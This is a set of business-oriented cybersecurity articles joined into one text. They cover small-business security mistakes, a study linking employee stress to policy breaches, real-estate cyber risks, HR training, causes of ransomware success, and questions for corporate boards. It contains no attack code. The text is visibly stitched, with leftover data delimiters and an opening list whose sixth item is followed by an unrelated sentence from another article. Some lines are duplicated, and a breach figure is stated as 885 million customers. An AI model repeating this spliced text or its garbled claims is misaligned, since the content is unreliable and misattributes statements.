1. You assume your business is too small to be on the attacker’s checklist

54% of private businesses assume they’re too small for a cyberattack, therefore, don’t have a proper setup for responding to digital attacks. This absence of—or even nonexistence of—network safety could be lethal for a business. Some of the private ventures don’t have a clue how to protect their assets from cyberattacks, and some don’t have strong IT security staff/workforce to deal with network safety measures and methods.

2. You have an incomplete stock of resources and endpoints.

Many IT experts trust the utilization of bring-your-own-device (BYOD) during remote work has made them more vulnerable to cyber-attacks. More than 50% of remote workers use their personal devices to access the company’s network. Without a precise stock of resources, patches and updates go unmonitored, leading to an increase in vulnerabilities of such endpoints.

3. You set it, and afterward, you fail to remember it.

Firewalls, antivirus, email security solutions are important, however, they’re not adequate. Organizations should fortify themselves by means of a multifaceted methodology. Rather than simply installing software, organizations should lead proactive safeguard measures, including regular vulnerability scans and infrastructure penetration tests

4. You disregard completing patches and upgrading on time.

When an organization finds a security imperfection, it develops a fix for it, which the end-user must install. In case the patch is not deployed, the chance of vulnerability increases. That is why it is important that organizations and end-users must install the update when it is delivered. 40% of organizations stand by to test and carry out patches to keep away from bugs.

5. You don’t understand your most prominent liability is your own employees.

Human beings are susceptible to social engineering assaults that maneuver individuals toward uncovering sensitive data. In 2020, phishing assaults increased by 11%.

6. You don’t have a reaction plan.

The reality is that compliance with cybersecurity policies can add to employees’ workloads, and so it should be considered and incentivized alongside other performance metrics when workloads are determined.","In the face of increasingly common (and costly) cyberattacks, many organizations have focused their security investments largely on technological solutions. However, in many cases, attacks rely not on an outsider’s ability to crack an organization’s technical defenses, but rather on an internal employee knowingly or unknowingly letting a bad actor in. But what motivates these employees’ actions? A recent study suggests that the vast majority of intentional policy breaches stem not from some malicious desire to cause harm, but rather, from the perception that following the rules would impede employees’ ability to get their work done effectively. The study further found that employees were more likely to violate policy on days when they were more stressed out, suggesting that high stress levels can reduce people’s tolerance for following rules that seem to get in the way of doing their jobs. In light of these findings, the authors suggest several ways in which organizations should rethink their approach to cybersecurity and implement policies that address the real, underlying factors creating vulnerabilities.

Last summer, Colonial Pipeline paid a ransom of almost $5 million after a cyberattack created widespread panic over the availability of gasoline across the Southeastern U.S. Just a few weeks later, the world’s largest meat processing company agreed to pay an $11 million ransom in response to a cyberattack that suspended operations at plants across the U.S., Canada, and Australia. Attacks like these have been growing more common for years, and the Covid-19 pandemic has only made matters worse, with the FBI reporting a 400% increase in cyberattacks in the first few months of the pandemic.

In response, investment into cybersecurity has skyrocketed — but unfortunately, these efforts haven’t always addressed the underlying factors that create vulnerabilities. While IT specialists toil away to create better, smarter, and safer technical systems, there is one risk they can’t program away: humans. Especially as remote work becomes more prevalent and thus access to secure systems becomes more distributed, one wrong click by an employee can often be enough to threaten an entire digital ecosystem.

Furthermore, while some organizations have begun to complement tech-focused efforts with cybersecurity initiatives targeting employees as potential attack vectors, these programs generally assume that employees break security protocols out of either ignorance or malicious intent. Our recent research, however, suggests that much of the time, failures to comply may actually be the result of intentional yet non-malicious violations, largely driven by employee stress.

Many Policy Violations Are Driven by Stress, Not Desire to Harm

We asked more than 330 remote employees from a wide range of industries to self-report on both their daily stress levels and their adherence to cybersecurity policies over the course of two weeks. In addition, we conducted a series of in-depth interviews with 36 professionals who were forced to work remotely due to the Covid-19 pandemic in order to get a better understanding for how the transition to work-from-home has impacted cybersecurity.

We found that across our sample, adherence to security conventions was intermittent. During the 10 workdays we studied, 67% of the participants reported failing to fully adhere to cybersecurity policies at least once, with an average failure-to-comply rate of once out of every 20 job tasks.

But what led to those breaches in protocol? When asked why they failed to follow security policies, our participants’ top three responses were, “to better accomplish tasks for my job,” “to get something I needed,” and “to help others get their work done.” These three responses accounted for 85% of the cases in which employees knowingly broke the rules. In contrast, employees reported a malicious desire to cause harm in only 3% of policy breaches — making non-malicious breaches (i.e., those motivated purely by the need to get work done) 28 times more common than retaliatory ones.

We also found that people were substantially more likely to knowingly break security protocols on days when they reported experiencing more stress, suggesting that being more stressed out reduced their tolerance for following rules that got in the way of doing their jobs. Common sources of stress included family demands that conflicted with work, job security fears, and ironically, the demands of the cybersecurity policies themselves: People were more likely to violate procedures when they worried that following them would hinder productivity, require extra time or energy, mean doing their jobs in a different way, or make them feel like they were constantly being monitored.

Of course, since our data was self-reported, we were unable to measure breaches that employees were unaware of committing. As such, our research is less conclusive when it comes to the prevalence of security issues borne of ignorance or human error. But our findings do suggest that despite considerable media focus on the “insider threat” posed by malicious employees, there are a lot of well-intentioned reasons that an employee might knowingly fail to fully follow the rules. Based on this, we’ve developed three key takeaways for managers:

There’s a Middle Ground Between Ignorance and Malice

Many leaders assume that employee security violations are either malicious or unintentional, and then design security policies based on that assumption. However, our research illustrates that there’s a sizable middle ground between ignorance and malice, and so managers would be wise to adapt their training programs and policies accordingly.

Specifically, rather than focusing on malicious attacks, security policies should acknowledge the fact that many employee-driven breaches stem from an attempt to balance security and productivity. This means educating employees and managers on the prevalence of non-malicious violations, and providing clear guidance on what to do if adherence to security practices seems to conflict with getting work done.

In addition, organizations should take steps to incorporate employees in the process of developing and user-testing security policies, and equip teams with the tools they’ll need to actually follow these policies. Too often, IT departments develop protocols in a vacuum, with limited understanding of how these rules might interfere with people’s workflows or create new sources of stress. Especially as the shift to remote work has transformed how many people work, IT leaders should be sure to involve the employees who will be affected by new security measures in their creation, evaluation, and implementation.

Job Design and Cybersecurity Are Intertwined

It’s common to think of security as secondary to productivity. In normal times, that’s not necessarily a problem, as employees are likely to have the resources to devote sufficient energy to both. But as the myriad stresses of the pandemic make it harder to maintain productivity, that means that security tends to take a backseat to the critical tasks that drive performance reviews, promotions, and bonuses.

To address this, managers must recognize that job design and cybersecurity are fundamentally intertwined. The reality is that compliance with cybersecurity policies can add to employees’ workloads, and so it should be considered and incentivized alongside other performance metrics when workloads are determined.

In addition, managers should work to identify and reduce sources of stress for their teams, since working under more-stressful conditions can impact employees’ consistency in following security protocols (not to mention their well-being and effectiveness across a slew of other metrics). In particular, especially as remote work becomes more common, managers should be cognizant of the psychological burden to employees of working under systems that monitor them. Surveillance systems that seemed reasonable in the office might feel intrusive at home — and even if there’s no obvious, direct fallout, our research suggests that the added stress could indirectly make people more likely to break security protocols.

Hackers Take Advantage of Altruism

Most managers would say it’s a good thing if their employees want to help one another. But unfortunately, altruism can come at a cost: In our study, around 18% of policy violations were motivated by a desire to help a coworker. The pandemic has only increased the challenges we all face every day, and thus has created even more opportunities for well-meaning employees to “help” their peers in ways that leave their organizations vulnerable. Hackers know this, and they will often intentionally use social engineering tactics that take advantage of employees’ willingness to bend the rules if they think they’re helping someone out.

To address this, managers must not only implement security policies specifically designed to protect against these sorts of attacks — they must also work to reduce the impact of these measures on employees’ workflows, and clearly explain their rationale, in order to increase employee compliance.

For example, as the move to remote work has reduced in-person communication, business email compromise (BEC) scams have become even more prevalent. These are scams in which an attacker poses as a supervisor or close coworker and emails employees with an urgent request to transfer funds. The time pressure and desire to help a colleague can push employees to break protocol and make these transfers without properly verifying the requests. Protecting your organization from these sorts of attacks means not just instituting a verification policy for large transactions, but also both educating employees on why the policy matters and minimizing the extent to which it impedes daily work.

. . .

In the modern cybersecurity landscape, every employee is a potential threat vector. To keep their organizations safe, technical and business leaders alike must understand the factors that can make anyone susceptible to flouting policy and opening the door to attackers. While the idea of a resentful employee purposefully trying to harm their company may make for a compelling story, our research points to the major role of employee stress in motivating non-malicious (yet potentially catastrophic) security breaches. To address the mounting risk of cyberattacks — as well as the countless other risks associated with an increasingly stressed-out workforce — leaders must undertake targeted efforts to minimize the root causes of stress in the workplace and design healthier, more sustainable workloads for employees at every level.

The COVID-19 pandemic spawned an uptick in digital attacks, with little to no safe harbor for businesses that make use of digital platforms. Real estate is no exception.

For real estate agents and the average homebuyer, being aware of and protecting yourself from these cybersecurity problems is an essential priority. Those in the cybersecurity industry can help support these real estate stakeholders with the tools and expertise necessary to manage these risks. However, it will first require an understanding of how common cybersecurity problems affect the real estate industry.

Here, you can explore these problems as well as potential solutions and protections to offer homebuyers.

The cybersecurity risks in real estate

These days, just about every real estate practice has its online component. From listing a home to closing sales during Zoom meetings, we are connected more than ever before during real estate business. At any of these virtual touchstones, malware may make it into the system, or scam artists may make off with private information and even finances.

This is exactly what happened in the case of the First American data breach. Hackers targeted the real estate giant in 2019 and exposed the financial data of 885 million customers. This demonstrates the risks posed to an industry valued at more than $32 trillion. With real estate making up such a prominent target, it’s more important than ever that agents and homebuyers stay aware of the risks.

Some of the most common cybersecurity risks posed to real estate businesses include:

Business email compromise — this occurs when scammers use convincing emails to trick home buyers or real estate agents into wiring funds to fraudulent accounts.

— this occurs when scammers use convincing emails to trick home buyers or real estate agents into wiring funds to fraudulent accounts. Ransomware — ransomware infects a system and prevents it from functioning until the hacker is paid a ransom.

— ransomware infects a system and prevents it from functioning until the hacker is paid a ransom. Vendor compromise — this occurs when a third-party partner experiences a data breach that then affects real estate agents or clients.

These risks and more like them are the reasons cybersecurity training will be another necessary cost for realtors entering the field. Cybersecurity is just as important in real estate as it is everywhere else that sensitive financial data is involved. Since real estate represents one of the biggest and most meaningful investment types we can make, the importance of mitigating these risks is clear.

By being aware of these issues across the industry, you can help real estate professionals create comprehensive IT and cybersecurity solutions.

How to protect yourself and your clients

There is ample opportunity in the real estate sector for innovations in cybersecurity. Value can be cultivated through strong digital practices, and the right tools can help real estate companies get there. Protecting agents and homeowners will then be a matter of how well these businesses can maintain their cybersecurity standards as cybercriminals continue to innovate their own techniques.

You can help start mitigating these common cybersecurity problems in real estate by adopting and sharing policies like the following:

1. Start with employee education.

As many as 95% of data breaches are caused at least in part by human error. Sometimes, mitigating risk is as simple as educating a workforce on good digital hygiene. This includes covering practices like using strong passwords, being cautious with email, and not clicking on links you can’t fully trust.

2. Practice mobile device security.

Many real estate agents work remotely these days, while homebuyers search for homes on mobile applications. Mobile device security is an essential consideration for companies in this environment, and you can better practice it by encrypting your device, backing up your data, and using two-factor authentication.

3. Develop digital verification procedures.

Multi-factor authentication procedures are useful for more than just mobile devices. With all the virtual business taking place, real estate brokers need secure digital signature procedures that can be verified for authenticity.

4. Investigate partner security policies.

Every real estate stakeholder should look into the cybersecurity policies of the companies they are doing business with. For prospective homebuyers, this means asking your agent how they protect your information. For agents, this means partnering with finance and tech companies that have a proven record for security.

5. Look for opportunities to innovate.

Finally, the real estate industry can be best protected by cutting-edge solutions created by technology. From certificate-backed digital signatures to MFA for machine and device authentication, there are methods for protecting data at the forefront of cybersecurity that can be applied to property information. Look for new tech and partnerships to make innovation easier.

These are just a few ways in which the real estate industry can address the cybersecurity problems that it currently faces. By exploring opportunities in this vital sector of the economy, cybersecurity professionals can make a big difference in the state of real estate data as they help to make it safer. In the meantime, all those on the market for a home should take these common problems and best practices into consideration as they develop the right protections for them.

The bottom line

With cybersecurity such a daunting challenge of the modern era, even the real estate business is shadowed by the threat of data breaches. However, the demand for safe solutions means opportunities for security experts.

Real estate agents and prospective homebuyers can be best served by teaming up with these experts as they navigate property transactions. The result is secure financial data and a process you can trust.

As homebuyers increasingly face dangers in the digital real estate marketplace, it’s even more vital you incorporate these solutions into your business.

One of the several steps a new employee takes in the onboarding process often includes reading the cybersecurity tutorial. Along with checking off that they have read the employee handbook and chosen a health plan, knowing the differences between phishing and Trojan horse attacks can often feel like an unnecessary roadblock for new employees starting their first day of “real” work.

But there are real-world consequences to ignoring this important tutorial. For instance, according to a survey conducted by training solution provider Epignosis and vulnerability management company Kenna Security, 61% of employees who received cybersecurity training still failed a basic cybersecurity test.

What does this mean for HR leaders?

Cybersecurity is a responsibility shared by both the IT and HR departments, says Fred Bellamy, a member of Dickinson Wright, a law firm that specializes in cybersecurity and risk issues.

“Cybersecurity is only as strong as the organization’s weakest link, so if many employees don’t understand even their most basic training, then the organization is vulnerable to the operational, reputational and legal risks from a cyber attack,” he says. “Investing a lot of resources in technological defenses can be defeated by human error among poorly trained employees.”

After a data breach, government investigators will frequently request the organization’s training materials, and if they’re inadequate, that can hurt the company in defending its cybersecurity practices, according to Bellamy.

So, after ensuring training is robust, how do HR and IT leaders get more employees to take it seriously? There is no reason training to reduce hacks and infiltrations has to be boring, Bellamy says.

“People are interested in protecting their organizations–and themselves and their families in their personal lives–so choose training programs that people will pay attention to and learn from,” he says. He adds that real-life stories of data breaches, gamified quizzes and other techniques can make sessions more engaging for employees.

There are a few reasons why cybersecurity training is usually far from exciting. The first is that employees often don’t see how cybersecurity training relates to their direct responsibilities, says Christina Gialleli, director of people operations at Epignosis.

“Other reasons that employees are turned off by cybersecurity training are they believe they already know everything there is to know about it, and cybersecurity training materials often include overly complicated, technical language that is difficult for employees to digest and retain,” she says, adding that Epignosis survey respondents suggested creating tutorials with simpler, less technical language, and adding fun, game-like elements and interactivity.

The survey of 1,200 employees also found that 59% of employees were trained on cybersecurity as a response to the work-from-home shift caused by COVID-19. Of the 61% who failed the basic test, the highest fail rates were reported in industries that should presumably know better: information services and data (83% of employees failed) and software (73% of employees failed). A full one-third of employees surveyed store their passwords in their web browsers, even though this practice puts network security at risk.

Meanwhile, as the shift to remote work continues, HR leaders should be cognizant that remote employees collectively feel less safe from threats (63%) than office employees (51%).

The way HR leaders present cybersecurity training can have a big impact on whether employees believe the training is ultimately worth their time and investment, says Gialleli.

“Employees want to feel like they are truly benefitting from training courses and not just completing them to check off a box,” she says. “But it’s equally important to make employees understand why cybersecurity is important and that, within the organization, they are the first line of defense against attacks.”",Cybersecurity Failure,2021-10-29 07:00:00

What to Do About the Ransomware ScourgeUnfortunately, there is no silver bullet to stop the existential threat ransomware poses to computing, critical infrastructure and the increasingly interconnected world we live in.","Hardly a week goes by without another major company falling victim to a ransomware attack. Nate Warfield, CTO at Prevailion, discusses the immense challenges in changing that status quo.

Yes, security is hard – no one is ever 100 percent safe from the threats lurking out there. But how is it that time and time again, companies – big companies – are continuing to fall for ransomware attacks? Why aren’t we getting any better at preventing them?

Let’s explore the main reasons why, starting with some basics before getting more in-depth:

2FA lags

User error will never go away

Outdated AV

Detection & response delays

“Living off the land” detection fails

Cobalt Strike and other legitimate tools repurposed

Cybercrime collaboration is masterclass

Public-policy failure & geopolitical problems

Cryptocurrency fuel

2FA Not Implemented Universally

Two-factor authentication (2FA) is probably the easiest security improvement an organization can implement, and it’s one of the most advocated-for solutions by infosec professionals. Despite this, we continue to see breaches like Colonial Pipeline occur because organizations have either failed to implement 2FA or have failed to *fully* implement it.

Anything that requires a username and password to access should have 2FA enabled. That means email, business applications, cloud deployments, VPNs – anything with logon credentials.

User Errors Will Never Stop – Why Pretend Otherwise?

Modern phishing techniques are so advanced that even infosec practitioners fall prey to them, so how can the average user be expected to perform any better?

Attackers perform recon against their targets and tune their techniques for success. And many employees’ workflows are literally a case study in what phishing attacks target. After all, how can Pat in accounting – whose job it is to open PDFs and process purchase orders – be expected to know on-sight which PDF is safe and which could contain malware?

We place unrealistic expectations on users, then act surprised and blame them when they make the same mistake many infosec pros have made themselves. Dave Aitel hit the nail on the head years ago when he argued that employees can’t be expected to not screw up. Employees are always going to make mistakes, so why do we pretend that will change?

Antivirus Solutions Rely on Easily Bypassed Detection Logic

Antivirus, the oldest security software in existence, has come a long way in the last 20 years. However, many AV solutions still rely on antiquated signature-based systems to detect malicious software.

Detecting malicious code with AV is predicated on having a binary signature of the code, or a file hash, and this only works if the code doesn’t change. Renaming functions inside the code prior to compiling it or moving code blocks around inside the code can render a previously viable detection useless.

Traditional AV does not “detonate” malware – that is, run the code in a protected sandbox – so even though the behavior of the malware will be identical regardless of its signature, this is extremely difficult to detect.

This problem is so systemic that frameworks like Invoke-Obfuscation exist to help red teams – and subsequently malicious actors – bypass antivirus solutions.

EDR/XDR/MDR Solutions Are Prone to Delays

The myriad of “DR” (detection and response) endpoint solutions are significantly more robust than antivirus, but they too have their limits.

Since the logic to process endpoint events lives in the cloud, it means there can be a delay of several seconds to several minutes between an event occurring and its arrival in the administrator’s console. This makes them prone to missing ransomware execution.

When a ransomware payload is activated, the entire network can be shut down within a matter of seconds, maybe minutes. Ransomware operators will frequently stage the actual ransomware payload across all systems in the network ahead of time, so that the payload is executed nearly simultaneously across all systems in the organization, and far faster than a DR solution will be able to detect.

It’s worth pointing out that DR+AV solutions from the same vendor frequently come with a ‘block’ option which may allow the administrator to isolate/quarantine a machine if a malicious payload or sequence of actions is detected. However, in practice this option is generally disabled by default and – due to concerns of impacting user productivity due to false positives – it’s frequently left disabled.

LOLBin Techniques Are Harder to Detect

Another common reason why ransomware succeeds is that the operators have learned to use a technique called “living off the land binaries” (LOLBins).

These are normal administrative tools, generally in Microsoft Windows, but all modern operating systems have some. These tools have valid, legitimate purposes and are used every day by administrators, which makes the detection of malicious use of these tools exceedingly difficult. For example, the recent leak of the Conti group’s playbook shows a heavy reliance on standard Windows administrative tooling.

It’s trivial for antivirus and DR solutions to catch bespoke, actor-developed tools, but nearly impossible to determine if commands to look up the local Domain Controllers and who the Domain Administrators are were done as part of troubleshooting network connectivity or a precursor to lateral movement. For this reason, most DR vendors either don’t alert on use of these LOLBins, or alert with low severity as these commands have a very high false-positive rate when used to detect malicious activity.

In some cases, the LOLBin tools can be leveraged for additional functionality which was added to the code because a developer or customer at one point wanted their administrative tools to have the ability to download arbitrary files from the internet, or the tools themselves can start secondary applications.

This is done to bypass a security control called Application Allow-Listing. Allow-listing tells the operating system not to run any software unless it has been digitally signed by a trusted vendor (Apple, Google, Microsoft, etc.). However, by tricking a valid, signed application into opening an untrusted, unsigned application, the attackers can bypass this security control with nothing more than default applications which are part of the operating system.

Freely Available Attack Toolsets Have Lowered the Bar for Ransomware Groups

Attackers have never had it better in terms of freely available tooling, such as Metasploit and Mimikatz, or pirated copies of Cobalt Strike.

Whether they need phishing toolsets, obfuscation frameworks, initial access tools, command-and-control (C2) infrastructure, credential-abuse tools or even open-source ransomware payloads, nearly all of this can be found for free on GitHub. Most people assume malicious actors are hiding on the Dark Web, selling tools for Bitcoin to only the shadiest of black hats, but this simply isn’t true.

The industry has given offensive security professionals its blessing to develop and release attack frameworks under the rationale that “defenders need to understand these tactics.” But this glosses over the fact that attack frameworks also help the attackers and make it harder for defenders to keep up.

While it’s true that defenders do need to understand offensive tactics, in reality, most defenders are too swamped in day-to-day work to have the time to test every offensive framework and then develop defensive guidance.

Most of these attack tools are well documented in their use, but not their detection. And while the barrier for entry of an attacker has dropped to “can you use Google, GitHub and have basic computer skills,” defenders are left paying huge sums of money for complex tooling and appliances which may only perform well in a controlled test scenario.

Ransomware Groups Collaborate Better than the InfoSec Industry

Ransomware cartels exist because they collaborate. In fact, most in the security industry agree that bad actors actually collaborate *better* than the teams and organizations trying to stop them.

By spreading the work across multiple criminal groups, it makes the tactics, techniques and procedures (TTPs) harder to attribute to any single actor, it can obfuscate the intentions of the malicious actor and it allows ransomware-as-a-service (RaaS) cartels to prioritize high-value targets.

The profit-sharing model of RaaS works well to motivate these actors to constantly find new targets, while shifting the heavy lifting to more sophisticated professionals. This method of collaboration leads to a highly effective division of labor, with criminal groups farming out initial access, and requiring their affiliates to select high-value, high-net-worth organizations that are more likely to pay the ransom than a small family-owned business (although the latter clearly isn’t immune).

Once the attacker determines the business they’ve impacted and the value of the company, they’ll set the ransom to something the victim can afford. An attack which costs one company $10,000 might cost another company $10 million, and it’ll use the exact same tooling, attack flow, access broker and ransomware payload.

Lack of Coordinated Response & Strategy in Both Private & Public Sectors

Ransomware isn’t a new threat, but it’s become increasingly easier to accomplish, get paid and get away with. A big part of the problem is at the public-sector level – for years, there has been no clear policy, direction or strategic planning for how the federal government should address these attacks. We are struggling to develop a consistent policy for deterrence, as well as for response.

So, many businesses that are hit are left with no recourse except to pay the ransom.

The U.S. government’s targeted prosecutions of individuals has had little if any impact on criminal or nation-state activity. And public/private sector coordination has been sorely lacking; it has only recently become a greater priority.

The Geopolitical Conundrum

The above-mentioned public-policy problems are exacerbated by that fact that ransomware gangs frequently operate in countries outside of U.S. jurisdiction and without U.S. extradition agreements.

Countries like Russia have made it clear they will not extradite bad actors from their country, unless it’s part of a much larger deal with the U.S. (and geopolitical strategy), nor will they take any domestic law-enforcement action unless these actors attack Russian businesses. This means criminals are essentially free to operate – unhindered and with impunity.

This is why most ransomware payloads check for Russian and bordering country languages in-use by the operating system and immediately, harmlessly, self-destruct if they detect themselves running on a system in a country where an attack could draw the ire of the Russian government.

The geopolitical aspects of this problem are non-trivial, if they can even be addressed. The internet has no borders, and while an attacker may decide to obfuscate their location and mimic a Russian-based attacker, there is no way to determine with absolute certainty that the attack originated from within Russian borders. This makes traditional government methods of bending a country to their will – like sanctions, embargoes, import tax increases, etc. – an infeasible way of inflicting consequences.

Cryptocurrency Fuels the Entire Industry

Cryptocurrency will be remembered for two things: Facilitating ransomware and exponentially increasing CO2 output. In all seriousness, without a robust cryptocurrency ecosystem, ransomware gangs would be starved out of existence.

Cryptocurrency fuels the entire criminal industry, as it provides a financial framework that bypasses the U.S.-controlled global financial system, is often difficult to trace (even though ransom payments are often demanded in Bitcoin, they are then transferred into a different, untraceable cryptocurrency before withdrawing the funds) and easily crosses international boundaries.

Although the U.S. Treasury Department recently sanctioned the cryptocurrency exchange SUEX for its alleged involvement in ransomware crime, this action is just a drop in the ocean. These groups can also shift to different exchanges, require direct transactions from victims or switch to harder to trace cryptocurrency like Monero.

If the U.S. government wants to get serious about crippling the criminal cryptocurrency industry, it should target the untraceable coins themselves – by sanctioning any business (crypto or otherwise) that allows these transactions and conversions.

What to Do About the Ransomware Scourge

Unfortunately, there is no silver bullet to stop the existential threat ransomware poses to computing, critical infrastructure and the increasingly interconnected world we live in.

Users and organizations need to be ever vigilant, adopt multi-layered security approaches [some ideas for strategizing can be found here — Ed.], and understand that early detection and prompt remediation of any breach – no matter how small – is a far more economical approach than the alternative.

Simply asking these questions will also raise awareness of the importance of cybersecurity, and the need to prioritize action.

Boards have a unique role in helping their organizations manage cybersecurity threats. They do not have day to day management responsibility, but they do have oversight and fiduciary responsibility. Don’t leave any questions about critical vulnerabilities for tomorrow. Asking the smart questions at your next board meeting might just prevent a breach from becoming a total disaster.

For every new technology that cybersecurity professionals invent, it’s only a matter of time until malicious actors find a way around it. We need new leadership approaches as we move into the next phase of securing our organizations. For Boards of Directors (BODs), this requires developing new ways to carry out their fiduciary responsibility to shareholders, and oversight responsibility for managing business risk. Directors can no longer abdicate oversight of cybersecurity or simply delegate it to operating managers. They must be knowledgeable leaders who prioritize cybersecurity and personally demonstrate their commitment. Many directors know this, but still seek answers on how to proceed.

We conducted a survey to better understand how boards deal with cybersecurity. We asked directors how often cybersecurity was discussed by the board and found that only 68% of respondents said regularly or constantly. Unfortunately, 9% said it wasn’t something their board discussed.

When it comes to understanding the board’s role, there were several options. While 50% of respondents said there had been discussion of the board’s role, there was no consensus about what that role should be. Providing guidance to operating managers or C-level leaders was seen as the board’s role by 41% of respondents, participating in a tabletop exercise (TTX) was mentioned by 14% of the respondents, and general awareness or “standing by to respond should the board be needed” was mentioned by 23% of Directors. But 23% of respondents also said there was no board plan or strategy in place.

Building on our findings, we developed the following recommendations for what Boards of Directors need to know, actionable steps directors can take, and smart questions you should ask at your next meeting.

Five things directors need to know about cybersecurity.

1. Cybersecurity is about more than protecting data.

Back in the “old days,” protecting organizations from cyber incidents was primarily seen as protecting data. Company execs worried about personal information being leaked, customer lists being stolen, and credit cards being used fraudulently. These are still issues, but cybersecurity is about more than just protecting data. As we have digitized our processes and our operations, connected our industrial complexes to control systems that enable remote management of large equipment, and linked our supply chains with automatic ordering and fulfillment processes, cybersecurity has taken on a much larger position in our threat landscape. Poor oversight can mean more than paying fines because data was not protected appropriately. Directors need a real picture of the cyber-physical and cyber-digital threats their organizations face.

2. The BODs must be knowledgeable participants in cybersecurity oversight.

It’s the BOD’s role to make sure the organization has a plan and is as prepared as it can be. It’s not the board’s responsibility to write the plan. There are many frameworks available to help an organization with their cybersecurity strategy. We like the NIST Cybersecurity Framework, which is a framework developed by the U.S. National Institute of Standards and Technology (NIST). It is simple and gives executives and directors a good structure for thinking through the important aspects of cybersecurity. But it also has many levels of detail that cyber professionals can use to install controls, processes, and procedures. Effective implementation of NIST can prepare an organization for a cyberattack, and mitigate the negative after-effects when an attack occurs.

The NIST framework has 5 areas: identify, protect, detect, respond, and recover. Organizations who are well-prepared for a cyber incident have documented plans for each of these areas of the NIST framework, have shared those plans with leaders, and practiced the actions to be taken to build muscle memory for use in a breach situation.

3. Boards must focus on risk, reputation, and business continuity.

When cyber professionals develop policies and practices, the fundamental triad of goals is to ensure confidentiality, integrity, and availability of both systems and data (the “CIA” of cybersecurity). That’s necessary, but the discussion would be very different than one about the goals of risk, reputation, and business continuity, which are the key concerns of the BOD.

While the board tends to strategize about ways to manage business risks, cybersecurity professionals concentrate their efforts at the technical, organizational, and operational levels. The languages used to manage the business and manage cybersecurity are different, and this might obscure both the understanding of the real risk and the best approach to address the risk. Perhaps because cybersecurity is a rather complex, technical field, the board might not be fully aware of cyber-risks and the necessary protective measures that need to be taken. But there are actionable approaches to address this.

Directors do not need to become cyber experts (although having one on the board is a good idea). By focusing on common goals: keeping the organization safe and operational continuity, the gap between the BOD role and the cybersecurity professionals’ role can be narrowed. Establishing clear, consistent communication to share useful and objective metrics for information, systems controls, and human behaviors is the first step. Comparisons to existing best practices and methodologies for cybersecurity risk management is another activity to identify areas of need and areas of strength in the organization. Directors asking smart questions of their cybersecurity executives is yet a third action to close the gap.

4. The prevailing approach to cybersecurity is defense-in-depth.

A series of layered protective measures can safeguard valuable information and sensitive data because a failure in one of the defensive mechanisms can be backed up by another, potentially impeding the attack and addressing different attack vectors. This multi-layered approach is commonly referred to as the “castle approach” because it mirrors the layered defenses of a medieval castle to avoid external attacks.

Layers of defense often include technology, controls, policy, and organization mechanisms. For example, firewalls (and many companies have multiple firewalls), identity and access management tools, encryption, penetration testing, and many others are all technological defenses that provide barriers to, or detection of, breaches. Artificial intelligence technologies promise to strengthen these barriers as new and persistent threats arise. But technology alone cannot keep us safe enough. Security Operations Centers (SOCs) provide oversight and human involvement to notice things the technologies miss, as was the case in the SolarWinds breach, where an astute associate noticed something unusual and investigated. But even SOCs can’t keep the organization 100% safe.

Policies and procedures are necessary to meet control requirements and those are set up by management. And, frankly, in today’s world, we need every single person in our organizations to provide some level of defense. At a minimum, everyone must be aware of scams and social engineering attempts to avoid falling victim. By the way, that includes directors, who are also targets and must know enough to not be caught by fallacious emails or notices.

5. Cybersecurity is an organizational problem, not just a technical problem.

Many cybersecurity problems occur because of human error. A study from Stanford University revealed that 88% of data breach incidents were caused by employee mistakes. Aligning all employees, not just the cybersecurity team, around practices and processes to keep the organization safe is not a technical problem — it’s an organizational one. Cybersecurity requires awareness and action from all members of the organization to recognize anomalies, alert leaders, and ultimately to mitigate risks.

Our research at MIT suggests this is best done by creating a cybersecurity culture. We define a “cybersecurity culture” as an environment infused with the attitudes, beliefs and values which motivate cybersecurity behaviors. Employees not only follow their job descriptions but also consistently act to protect the organization’s assets. This does not mean that every employee becomes a cybersecurity expert; it means that each employee is held accountable for overseeing and behaving as if he or she was a “security champion.” This adds a human layer of protection to avoid, detect, and report any behavior that can be exploited by a malicious actor.

Leaders set the tone for prioritizing this kind of culture, but they also reinforce and personify the values and beliefs for action. The BOD has a role in this, too. Simply by asking questions about cybersecurity, directors imply that it is an important topic for them, and that sends the message that it needs to be a priority for corporate executives.

The questions your board needs to hear.

Here is a list of seven questions to ask to make sure your board understands how cybersecurity is being managed by your organization. Simply asking these questions will also raise awareness of the importance of cybersecurity, and the need to prioritize action.

1. What are our most important assets and how are we protecting them?

We know we cannot be 100% secure. Difficult decisions must be made. The BOD must make sure the organization’s most important assets are secure at the highest reasonable level. Is that your customer data, your systems and operational processes, or your company IP? Asking what is being protected and what needs to be protected is an important first step. If there is no agreement on what to protect, the rest of the cybersecurity strategy is moot.

2. What are the layers of protection we have put in place?

Protection is done with multiple layers of defense, procedures and policies, and other risk management approaches. Boards don’t need to make the decision on how to implement each of these layers, but the BOD does need to know what layers of protection are in place, and how well each layer is protecting the organization.

3. How do we know if we’ve been breached? How do we detect a breach?

The BOD would be ignoring an important part of their fiduciary responsibility if it does not ensure that the organization has both protection and detection capabilities. Since many breaches are not detected immediately after they occur, the BOD must make sure it knows how a breach is detected and agree with the risk level resulting from this approach.

4. What are our response plans in the event of an incident?

If a ransom is sought, what is our policy about paying it? Although the board is not likely to be part of the detailed response plan itself, the BOD does want to be sure that there is a plan. Which executives and leaders are part of the response plan? What is their role? What are the communications plans (after all, if systems are breached or unreliable, how will we communicate?). Who alerts authorities? Which authorities are alerted? Who talks to the press? Our customers? Our suppliers? Having a plan is critical to responding appropriately. It’s highly unlikely the plan will be executed exactly as designed, but you don’t want to wait until a breach happens to start planning how to respond.

5. What is the board’s role in the event of an incident?

It would be helpful for the BOD to know what their role will be and to practice it. Is the board’s role to decide on paying a ransom or not, to talk to the largest customers, to be available for emergency meetings with organization execs to make just-in-time decisions? An earlier article of ours discussed the importance of practicing responses. Using fire drills and tabletop exercises to build muscle memory sounds like a luxury, but should your company have an incident, you want to be sure that response muscle is ready to work.

6. What are our business recovery plans in the event of a cyber incident?

Many execs we have interviewed have not tested their business recovery plans. There can be significant differences in the recovery from a business disruption due to a cyber incident. Data recovery might be different if all records are destroyed or corrupted by a malicious actor who encrypts files or manipulates them. BODs want to know who “owns” business recovery, whether there is a plan for how to make it happen, and if it has been tested with a cyber incident in mind?

7. Is our cybersecurity investment enough?

